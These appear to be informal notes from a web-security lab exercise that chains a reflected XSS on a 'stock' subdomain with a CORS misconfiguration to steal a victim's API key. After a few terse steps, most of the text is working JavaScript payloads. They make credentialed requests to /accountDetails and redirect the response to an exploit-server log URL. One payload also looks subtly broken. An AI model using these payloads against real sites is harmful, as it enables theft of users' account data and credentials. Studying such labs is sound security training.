write up:
    investigate req and res
    try add origin in get /accountDetails => fail
    check post => check stock => popup new window with subdomain stock.....
    => try attack subdomain web
    after try xss in url => procductId is vulnerable => we can use this to attack victim
    => try attack in weiner => success
    => deliver to victim

payload:
<script>
    var req = new XMLHttpRequest();
    var url = 'https://0ac7009f034cd9c1c18426c10049001e.web-security-academy.net';
    req.onload = function() {
        location = 'https://exploit-0ae900f203dcd95ec1a12528016800a5.exploit-server.net/log/?apikey=' + this.responseText;
    };
    req.open('GET',url+'/accountDetails',true);
    req.withCredentials = true;
    req.send();
</script>


<script>
document.location="http://stock.0ac7009f034cd9c1c18426c10049001e.web-security-academy.net/?productId=1<script>var req = new XMLHttpRequest();var url = 'https://0ac7009f034cd9c1c18426c10049001e.web-security-academy.net';req.onload = function() {location = urlExploit + '/log/?apikey=' + this.responseText;};req.open('GET','https://exploit-0ae900f203dcd95ec1a12528016800a5.exploit-server.net/accountDetails',true);req.withCredentials = true;req.send();%3c/script>&storeId=1"
</script>



example:
document.location="http://stock.0ac7009f034cd9c1c18426c10049001e.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0ac7009f034cd9c1c18426c10049001e.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0ae900f203dcd95ec1a12528016800a5.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"

<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+this.responseText; };
</script>
